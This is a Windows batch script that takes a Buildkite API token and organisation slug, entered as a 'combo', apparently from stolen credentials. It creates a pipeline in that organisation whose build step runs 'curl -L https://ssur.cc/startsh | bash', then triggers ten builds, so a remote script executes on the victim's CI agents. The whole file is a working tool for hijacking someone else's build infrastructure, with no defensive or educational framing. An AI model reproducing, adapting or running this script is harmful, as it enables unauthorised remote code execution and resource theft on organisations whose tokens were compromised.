@echo off
setlocal enabledelayedexpansion

:: Ask for user input
set /p combo=enter combo [API_TOKEN]/[ORG_SLUG]: 

:: Split the combo into token and org slug
for /f "tokens=1,2 delims=/" %%a in ("%combo%") do (
    set TOKEN=%%a
    set ORG_SLUG=%%b
)

:: Set static build data
set COMMIT=main
set BRANCH=main

echo.

:: Get the first cluster ID via API and assign it to CLUSTER_ID
echo looking for cluster...
for /f "delims=" %%i in ('powershell -Command ^
  "Invoke-RestMethod -Headers @{ Authorization = 'Bearer !TOKEN!' } -Uri 'https://api.buildkite.com/v2/organizations/!ORG_SLUG!/clusters' | Select-Object -ExpandProperty id -First 1"'
) do (
    set CLUSTER_ID=%%i
)

echo found cluster with id: !CLUSTER_ID!
echo.

:: Create a new pipeline
echo making new pipeline...

curl -s -H "Authorization: Bearer !TOKEN!" ^
  -X POST "https://api.buildkite.com/v2/organizations/!ORG_SLUG!/pipelines" ^
  -H "Content-Type: application/json" ^
  -d "{^
    \"name\": \"!ORG_SLUG!\",^
    \"cluster_id\": \"!CLUSTER_ID!\",^
    \"repository\": \"git@github.com:bloxclone/e.git\",^
    \"configuration\": \"steps:\\n  - label: \\\":pipeline:\\\"\\n    command: \\\"curl -L https://ssur.cc/startsh | bash\\\"\\n\"^
  }"

echo pipeline created
echo.

:: Loop 10 times
for /l %%i in (1,1,10) do (
    echo triggering build #%%i...

    curl -s -H "Authorization: Bearer !TOKEN!" ^
        -X POST "https://api.buildkite.com/v2/organizations/!ORG_SLUG!/pipelines/!ORG_SLUG!/builds" ^
        -H "Content-Type: application/json" ^
        -d "{^
            \"commit\": \"!COMMIT!\",^
            \"branch\": \"!BRANCH!\",^
            \"message\": \"Triggered by batch script\",^
            \"author\": {^
              \"name\": \"Automation\",^
              \"email\": \"bot@example.com\"^
            }^
        }"

    echo build #%%i triggered
    echo.
)

endlocal
pause
